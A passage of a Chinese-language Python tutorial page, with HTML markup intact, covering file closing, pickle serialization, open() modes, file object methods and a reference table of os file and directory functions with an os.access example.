title=\"f.close()\"></a>f.close()</h5><p>当你处理完一个文件后, 调用 f.close() 来关闭文件并释放系统的资源</p>\n<h4 id=\"pickle模块\"><a href=\"#pickle模块\" class=\"headerlink\" title=\"pickle模块\"></a>pickle模块</h4><p>python的pickle模块实现了基本的数据序列和反序列化</p>\n<p>基本接口：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">pickle<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span>protocol<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>有了 pickle 这个对象, 就能对 file 以读取的形式打开:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">x <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>示例</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n\n<span class=\"token comment\"># 使用pickle模块将数据对象保存到文件</span>\ndata1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2.0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token operator\">+</span><span class=\"token number\">6j</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n         <span class=\"token string\">'b'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'string'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">u'Unicode string'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n         <span class=\"token string\">'c'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">}</span>\n\nselfref_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span>\nselfref_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>selfref_list<span class=\"token punctuation\">)</span>\n\noutput <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'data.pkl'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># Pickle dictionary using protocol 0.</span>\npickle<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span>data1<span class=\"token punctuation\">,</span> output<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># Pickle the list using the highest protocol available.</span>\npickle<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span>selfref_list<span class=\"token punctuation\">,</span> output<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\noutput<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"File-文件-方法\"><a href=\"#File-文件-方法\" class=\"headerlink\" title=\"File(文件)方法\"></a>File(文件)方法</h2><h3 id=\"open-方法\"><a href=\"#open-方法\" class=\"headerlink\" title=\"open()方法\"></a>open()方法</h3><p>open() 函数常用形式</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">,</span> mode<span class=\"token operator\">=</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>完整的语法格式</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">,</span> mode<span class=\"token operator\">=</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">,</span> buffering<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> encoding<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> errors<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> newline<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> closefd<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> opener<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>参数说明</p>\n<ul>\n<li>file: 必需，文件路径（相对或者绝对路径）</li>\n<li>mode: 可选，文件打开模式</li>\n<li>buffering: 设置缓冲</li>\n<li>encoding: 一般使用utf8</li>\n<li>errors: 报错级别</li>\n<li>newline: 区分换行符</li>\n<li>closefd: 传入的file参数类型</li>\n<li>opener: 设置自定义开启器，开启器的返回值必须是一个打开的文件描述符。</li>\n</ul>\n<p>mode 参数</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">模式</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">t</td>\n<td align=\"left\">文本模式 (默认)。</td>\n</tr>\n<tr>\n<td align=\"left\">x</td>\n<td align=\"left\">写模式，新建一个文件，如果该文件已存在则会报错。</td>\n</tr>\n<tr>\n<td align=\"left\">b</td>\n<td align=\"left\">二进制模式。</td>\n</tr>\n<tr>\n<td align=\"left\">+</td>\n<td align=\"left\">打开一个文件进行更新(可读可写)。</td>\n</tr>\n<tr>\n<td align=\"left\">U</td>\n<td align=\"left\">通用换行模式（<strong>Python 3 不支持</strong>）。</td>\n</tr>\n<tr>\n<td align=\"left\">r</td>\n<td align=\"left\">以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td>\n</tr>\n<tr>\n<td align=\"left\">rb</td>\n<td align=\"left\">以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。</td>\n</tr>\n<tr>\n<td align=\"left\">r+</td>\n<td align=\"left\">打开一个文件用于读写。文件指针将会放在文件的开头。</td>\n</tr>\n<tr>\n<td align=\"left\">rb+</td>\n<td align=\"left\">以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。</td>\n</tr>\n<tr>\n<td align=\"left\">w</td>\n<td align=\"left\">打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>\n</tr>\n<tr>\n<td align=\"left\">wb</td>\n<td align=\"left\">以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>\n</tr>\n<tr>\n<td align=\"left\">w+</td>\n<td align=\"left\">打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>\n</tr>\n<tr>\n<td align=\"left\">wb+</td>\n<td align=\"left\">以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>\n</tr>\n<tr>\n<td align=\"left\">a</td>\n<td align=\"left\">打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>\n</tr>\n<tr>\n<td align=\"left\">ab</td>\n<td align=\"left\">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>\n</tr>\n<tr>\n<td align=\"left\">a+</td>\n<td align=\"left\">打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td>\n</tr>\n<tr>\n<td align=\"left\">ab+</td>\n<td align=\"left\">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td>\n</tr>\n</tbody></table>\n<p>默认为文本模式，如果要以二进制模式打开，加上 <strong>b</strong> </p>\n<h3 id=\"file-对象\"><a href=\"#file-对象\" class=\"headerlink\" title=\"file 对象\"></a>file 对象</h3><p>file 对象使用 open 函数来创建</p>\n<p>file 对象常用的函数</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">序号</th>\n<th align=\"left\">方法及描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-file-close.html\">file.close()</a>关闭文件。关闭后文件不能再进行读写操作。</td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-file-flush.html\">file.flush()</a>刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件, 而不是被动的等待输出缓冲区写入。</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-file-fileno.html\">file.fileno()</a>返回一个整型的文件描述符(file descriptor FD 整型), 可以用在如os模块的read方法等一些底层操作上。</td>\n</tr>\n<tr>\n<td align=\"left\">4</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-file-isatty.html\">file.isatty()</a>如果文件连接到一个终端设备返回 True，否则返回 False。</td>\n</tr>\n<tr>\n<td align=\"left\">5</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-file-next.html\">file.next()</a><strong>Python 3 中的 File 对象不支持 next() 方法。</strong>返回文件下一行。</td>\n</tr>\n<tr>\n<td align=\"left\">6</td>\n<td align=\"left\">[file.read(<a href=\"https://www.runoob.com/python3/python3-file-read.html\">size])</a>从文件读取指定的字节数，如果未给定或为负则读取所有。</td>\n</tr>\n<tr>\n<td align=\"left\">7</td>\n<td align=\"left\">[file.readline(<a href=\"https://www.runoob.com/python3/python3-file-readline.html\">size])</a>读取整行，包括 “\\n” 字符。</td>\n</tr>\n<tr>\n<td align=\"left\">8</td>\n<td align=\"left\">[file.readlines(<a href=\"https://www.runoob.com/python3/python3-file-readlines.html\">sizeint])</a>读取所有行并返回列表，若给定sizeint&gt;0，返回总和大约为sizeint字节的行, 实际读取值可能比 sizeint 较大, 因为需要填充缓冲区。</td>\n</tr>\n<tr>\n<td align=\"left\">9</td>\n<td align=\"left\">[file.seek(offset<a href=\"https://www.runoob.com/python3/python3-file-seek.html\">, whence])</a>移动文件读取指针到指定位置</td>\n</tr>\n<tr>\n<td align=\"left\">10</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-file-tell.html\">file.tell()</a>返回文件当前位置。</td>\n</tr>\n<tr>\n<td align=\"left\">11</td>\n<td align=\"left\">[file.truncate(<a href=\"https://www.runoob.com/python3/python3-file-truncate.html\">size])</a>从文件的首行首字符开始截断，截断文件为 size 个字符，无 size 表示从当前位置截断；截断之后后面的所有字符被删除，其中 windows 系统下的换行代表2个字符大小。</td>\n</tr>\n<tr>\n<td align=\"left\">12</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-file-write.html\">file.write(str)</a>将字符串写入文件，返回的是写入的字符长度。</td>\n</tr>\n<tr>\n<td align=\"left\">13</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-file-writelines.html\">file.writelines(sequence)</a>向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。</td>\n</tr>\n</tbody></table>\n<h2 id=\"OS-文件-目录方法\"><a href=\"#OS-文件-目录方法\" class=\"headerlink\" title=\"OS 文件/目录方法\"></a>OS 文件/目录方法</h2><p>一部分函数只能在linux中使用</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">序号</th>\n<th align=\"left\">方法及描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-access.html\">os.access(path, mode)</a> 检验权限模式</td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-chdir.html\">os.chdir(path)</a> 改变当前工作目录</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-chflags.html\">os.chflags(path, flags)</a> 设置路径的标记为数字标记。</td>\n</tr>\n<tr>\n<td align=\"left\">4</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-chmod.html\">os.chmod(path, mode)</a> 更改权限</td>\n</tr>\n<tr>\n<td align=\"left\">5</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-chown.html\">os.chown(path, uid, gid)</a> 更改文件所有者</td>\n</tr>\n<tr>\n<td align=\"left\">6</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-chroot.html\">os.chroot(path)</a> 改变当前进程的根目录</td>\n</tr>\n<tr>\n<td align=\"left\">7</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-close.html\">os.close(fd)</a> 关闭文件描述符 fd</td>\n</tr>\n<tr>\n<td align=\"left\">8</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-closerange.html\">os.closerange(fd_low, fd_high)</a> 关闭所有文件描述符，从 fd_low (包含) 到 fd_high (不包含), 错误会忽略</td>\n</tr>\n<tr>\n<td align=\"left\">9</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-dup.html\">os.dup(fd)</a> 复制文件描述符 fd</td>\n</tr>\n<tr>\n<td align=\"left\">10</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-dup2.html\">os.dup2(fd, fd2)</a> 将一个文件描述符 fd 复制到另一个 fd2</td>\n</tr>\n<tr>\n<td align=\"left\">11</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-fchdir.html\">os.fchdir(fd)</a> 通过文件描述符改变当前工作目录</td>\n</tr>\n<tr>\n<td align=\"left\">12</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-fchmod.html\">os.fchmod(fd, mode)</a> 改变一个文件的访问权限，该文件由参数fd指定，参数mode是Unix下的文件访问权限。</td>\n</tr>\n<tr>\n<td align=\"left\">13</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-fchown.html\">os.fchown(fd, uid, gid)</a> 修改一个文件的所有权，这个函数修改一个文件的用户ID和用户组ID，该文件由文件描述符fd指定。</td>\n</tr>\n<tr>\n<td align=\"left\">14</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-fdatasync.html\">os.fdatasync(fd)</a> 强制将文件写入磁盘，该文件由文件描述符fd指定，但是不强制更新文件的状态信息。</td>\n</tr>\n<tr>\n<td align=\"left\">15</td>\n<td align=\"left\">[os.fdopen(fd<a href=\"https://www.runoob.com/python3/python3-os-fdopen.html\">, mode[, bufsize]])</a> 通过文件描述符 fd 创建一个文件对象，并返回这个文件对象</td>\n</tr>\n<tr>\n<td align=\"left\">16</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-fpathconf.html\">os.fpathconf(fd, name)</a> 返回一个打开的文件的系统配置信息。name为检索的系统配置的值，它也许是一个定义系统值的字符串，这些名字在很多标准中指定（POSIX.1, Unix 95, Unix 98, 和其它）。</td>\n</tr>\n<tr>\n<td align=\"left\">17</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-fstat.html\">os.fstat(fd)</a> 返回文件描述符fd的状态，像stat()。</td>\n</tr>\n<tr>\n<td align=\"left\">18</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-fstatvfs.html\">os.fstatvfs(fd)</a> 返回包含文件描述符fd的文件的文件系统的信息，Python 3.3 相等于 statvfs()。</td>\n</tr>\n<tr>\n<td align=\"left\">19</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-fsync.html\">os.fsync(fd)</a> 强制将文件描述符为fd的文件写入硬盘。</td>\n</tr>\n<tr>\n<td align=\"left\">20</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-ftruncate.html\">os.ftruncate(fd, length)</a> 裁剪文件描述符fd对应的文件, 所以它最大不能超过文件大小。</td>\n</tr>\n<tr>\n<td align=\"left\">21</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-getcwd.html\">os.getcwd()</a> 返回当前工作目录</td>\n</tr>\n<tr>\n<td align=\"left\">22</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-getcwdb.html\">os.getcwdb()</a> 返回一个当前工作目录的Unicode对象</td>\n</tr>\n<tr>\n<td align=\"left\">23</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-isatty.html\">os.isatty(fd)</a> 如果文件描述符fd是打开的，同时与tty(-like)设备相连，则返回true, 否则False。</td>\n</tr>\n<tr>\n<td align=\"left\">24</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-lchflags.html\">os.lchflags(path, flags)</a> 设置路径的标记为数字标记，类似 chflags()，但是没有软链接</td>\n</tr>\n<tr>\n<td align=\"left\">25</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-lchmod.html\">os.lchmod(path, mode)</a> 修改连接文件权限</td>\n</tr>\n<tr>\n<td align=\"left\">26</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-lchown.html\">os.lchown(path, uid, gid)</a> 更改文件所有者，类似 chown，但是不追踪链接。</td>\n</tr>\n<tr>\n<td align=\"left\">27</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-link.html\">os.link(src, dst)</a> 创建硬链接，名为参数 dst，指向参数 src</td>\n</tr>\n<tr>\n<td align=\"left\">28</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-listdir.html\">os.listdir(path)</a> 返回path指定的文件夹包含的文件或文件夹的名字的列表。</td>\n</tr>\n<tr>\n<td align=\"left\">29</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-lseek.html\">os.lseek(fd, pos, how)</a> 设置文件描述符 fd当前位置为pos, how方式修改: SEEK_SET 或者 0 设置从文件开始的计算的pos; SEEK_CUR或者 1 则从当前位置计算; os.SEEK_END或者2则从文件尾部开始. 在unix，Windows中有效</td>\n</tr>\n<tr>\n<td align=\"left\">30</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-lstat.html\">os.lstat(path)</a> 像stat(),但是没有软链接</td>\n</tr>\n<tr>\n<td align=\"left\">31</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-major.html\">os.major(device)</a> 从原始的设备号中提取设备major号码 (使用stat中的st_dev或者st_rdev field)。</td>\n</tr>\n<tr>\n<td align=\"left\">32</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-makedev.html\">os.makedev(major, minor)</a> 以major和minor设备号组成一个原始设备号</td>\n</tr>\n<tr>\n<td align=\"left\">33</td>\n<td align=\"left\">[os.makedirs(path<a href=\"https://www.runoob.com/python3/python3-os-makedirs.html\">, mode])</a> 递归文件夹创建函数。像mkdir(), 但创建的所有intermediate-level文件夹需要包含子文件夹。</td>\n</tr>\n<tr>\n<td align=\"left\">34</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-minor.html\">os.minor(device)</a> 从原始的设备号中提取设备minor号码 (使用stat中的st_dev或者st_rdev field )。</td>\n</tr>\n<tr>\n<td align=\"left\">35</td>\n<td align=\"left\">[os.mkdir(path<a href=\"https://www.runoob.com/python3/python3-os-mkdir.html\">, mode])</a> 以数字mode的mode创建一个名为path的文件夹.默认的 mode 是 0777 (八进制)。</td>\n</tr>\n<tr>\n<td align=\"left\">36</td>\n<td align=\"left\">[os.mkfifo(path<a href=\"https://www.runoob.com/python3/python3-os-mkfifo.html\">, mode])</a> 创建命名管道，mode 为数字，默认为 0666 (八进制)</td>\n</tr>\n<tr>\n<td align=\"left\">37</td>\n<td align=\"left\">[os.mknod(filename<a href=\"https://www.runoob.com/python3/python3-os-mknod.html\">, mode=0600, device])</a> 创建一个名为filename文件系统节点（文件，设备特别文件或者命名pipe）。</td>\n</tr>\n<tr>\n<td align=\"left\">38</td>\n<td align=\"left\">[os.open(file, flags<a href=\"https://www.runoob.com/python3/python3-os-open.html\">, mode])</a> 打开一个文件，并且设置需要的打开选项，mode参数是可选的</td>\n</tr>\n<tr>\n<td align=\"left\">39</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-openpty.html\">os.openpty()</a> 打开一个新的伪终端对。返回 pty 和 tty的文件描述符。</td>\n</tr>\n<tr>\n<td align=\"left\">40</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-pathconf.html\">os.pathconf(path, name)</a> 返回相关文件的系统配置信息。</td>\n</tr>\n<tr>\n<td align=\"left\">41</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-pipe.html\">os.pipe()</a> 创建一个管道. 返回一对文件描述符(r, w) 分别为读和写</td>\n</tr>\n<tr>\n<td align=\"left\">42</td>\n<td align=\"left\">[os.popen(command<a href=\"https://www.runoob.com/python3/python3-os-popen.html\">, mode[, bufsize]])</a> 从一个 command 打开一个管道</td>\n</tr>\n<tr>\n<td align=\"left\">43</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-read.html\">os.read(fd, n)</a> 从文件描述符 fd 中读取最多 n 个字节，返回包含读取字节的字符串，文件描述符 fd对应文件已达到结尾, 返回一个空字符串。</td>\n</tr>\n<tr>\n<td align=\"left\">44</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-readlink.html\">os.readlink(path)</a> 返回软链接所指向的文件</td>\n</tr>\n<tr>\n<td align=\"left\">45</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-remove.html\">os.remove(path)</a> 删除路径为path的文件。如果path 是一个文件夹，将抛出OSError; 查看下面的rmdir()删除一个 directory。</td>\n</tr>\n<tr>\n<td align=\"left\">46</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-removedirs.html\">os.removedirs(path)</a> 递归删除目录。</td>\n</tr>\n<tr>\n<td align=\"left\">47</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-rename.html\">os.rename(src, dst)</a> 重命名文件或目录，从 src 到 dst</td>\n</tr>\n<tr>\n<td align=\"left\">48</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-renames.html\">os.renames(old, new)</a> 递归地对目录进行更名，也可以对文件进行更名。</td>\n</tr>\n<tr>\n<td align=\"left\">49</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-rmdir.html\">os.rmdir(path)</a> 删除path指定的空目录，如果目录非空，则抛出一个OSError异常。</td>\n</tr>\n<tr>\n<td align=\"left\">50</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-stat.html\">os.stat(path)</a> 获取path指定的路径的信息，功能等同于C API中的stat()系统调用。</td>\n</tr>\n<tr>\n<td align=\"left\">51</td>\n<td align=\"left\">[os.stat_float_times(<a href=\"https://www.runoob.com/python3/python3-os-stat_float_times.html\">newvalue])</a> 决定stat_result是否以float对象显示时间戳</td>\n</tr>\n<tr>\n<td align=\"left\">52</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-statvfs.html\">os.statvfs(path)</a> 获取指定路径的文件系统统计信息</td>\n</tr>\n<tr>\n<td align=\"left\">53</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-symlink.html\">os.symlink(src, dst)</a> 创建一个软链接</td>\n</tr>\n<tr>\n<td align=\"left\">54</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-tcgetpgrp.html\">os.tcgetpgrp(fd)</a> 返回与终端fd（一个由os.open()返回的打开的文件描述符）关联的进程组</td>\n</tr>\n<tr>\n<td align=\"left\">55</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-tcsetpgrp.html\">os.tcsetpgrp(fd, pg)</a> 设置与终端fd（一个由os.open()返回的打开的文件描述符）关联的进程组为pg。</td>\n</tr>\n<tr>\n<td align=\"left\">56</td>\n<td align=\"left\">os.tempnam([dir[, prefix]]) <strong>Python3 中已删除。</strong>返回唯一的路径名用于创建临时文件。</td>\n</tr>\n<tr>\n<td align=\"left\">57</td>\n<td align=\"left\">os.tmpfile() <strong>Python3 中已删除。</strong>返回一个打开的模式为(w+b)的文件对象 .这文件对象没有文件夹入口，没有文件描述符，将会自动删除。</td>\n</tr>\n<tr>\n<td align=\"left\">58</td>\n<td align=\"left\">os.tmpnam() <strong>Python3 中已删除。</strong>为创建一个临时文件返回一个唯一的路径</td>\n</tr>\n<tr>\n<td align=\"left\">59</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-ttyname.html\">os.ttyname(fd)</a> 返回一个字符串，它表示与文件描述符fd 关联的终端设备。如果fd 没有与终端设备关联，则引发一个异常。</td>\n</tr>\n<tr>\n<td align=\"left\">60</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-unlink.html\">os.unlink(path)</a> 删除文件路径</td>\n</tr>\n<tr>\n<td align=\"left\">61</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-utime.html\">os.utime(path, times)</a> 返回指定的path文件的访问和修改的时间。</td>\n</tr>\n<tr>\n<td align=\"left\">62</td>\n<td align=\"left\">[os.walk(top[, topdown=True[, onerror=None[, followlinks=False]]])](<a href=\"https://www.runoob.com/python3/python3-os-walk.html\">https://www.runoob.com/python3/python3-os-walk.html</a>) 输出在文件夹中的文件名通过在树中游走，向上或者向下。</td>\n</tr>\n<tr>\n<td align=\"left\">63</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-write.html\">os.write(fd, str)</a> 写入字符串到文件描述符 fd中. 返回实际写入的字符串长度</td>\n</tr>\n<tr>\n<td align=\"left\">64</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-path.html\">os.path 模块</a> 获取文件的属性信息。</td>\n</tr>\n<tr>\n<td align=\"left\">65</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-os-pardir.html\">os.pardir()</a> 获取当前目录的父目录，以字符串形式显示目录名。</td>\n</tr>\n</tbody></table>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">import</span> stat\n\nret <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>access<span class=\"token punctuation\">(</span><span class=\"token string\">\"D:/test.txt\"</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>F_OK<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"F_OK - 返回值 %s\"</span> <span class=\"token operator\">%</span> ret<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># F_OK - 返回值 True</span>\nret <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>access<span class=\"token punctuation\">(</span><span class=\"token string\">\"D:/test.txt\"</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>R_OK<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"R_OK - 返回值 %s\"</span> <span class=\"token operator\">%</span> ret<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># R_OK - 返回值 True</span>\nret <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>access<span class=\"token punctuation\">(</span><span class=\"token string\">\"D:/test.txt\"</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>W_OK<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W_OK - 返回值 %s\"</span> <span class=\"token operator\">%</span> ret<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># W_OK - 返回值 True</span>\nret <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>access<span class=\"token punctuation\">(</span><span class=\"token string\">\"D:/test.txt\"</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>X_OK<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"X_OK - 返回值 %s\"</span> <span class=\"token operator\">%</span> ret<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># X_OK - 返回值 True</span>\n\npath <span class=\"token operator\">=</span> <span class=\"token string\">'D:/'</span>\n<span class=\"token comment\"># 查看当前工作目录</span>\nretval <span 